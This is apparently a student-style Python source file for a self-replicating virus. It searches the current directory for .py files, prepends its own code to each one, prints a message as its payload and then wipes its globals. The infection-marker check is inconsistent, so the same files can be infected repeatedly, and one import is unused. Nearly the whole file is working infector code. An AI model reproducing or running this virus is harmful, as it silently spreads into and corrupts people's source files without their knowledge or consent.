import pefile
import glob

# Find file to infect why is python file (*.py)


def find_files_to_infect(directory="."):
    return [file for file in glob.glob("*.py")]

# Get the file content


def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

# Get the content of infectable file


def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

# Infected virus


def infect(file, virus_code):
    data = get_content_if_infectable(file)
    if(data):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

# Get the virus_code


def get_virus_code():
    is_infected = False
    virus_code = []
    code = get_content_of_file(__file__)

    # Check if it infected or not by using "begin-virus" and "end-virus"
    for line in code:
        if "# begin-virus\n" in line:
            is_infected = True
            break

        if not is_infected:
            virus_code.append(line)

    return virus_code

# Create virus payload


def summon_chaos():
    print("We are infected")


try:
    # Get the virus code
    virus_code = get_virus_code()

    # Find target to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    summon_chaos()

finally:

    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i
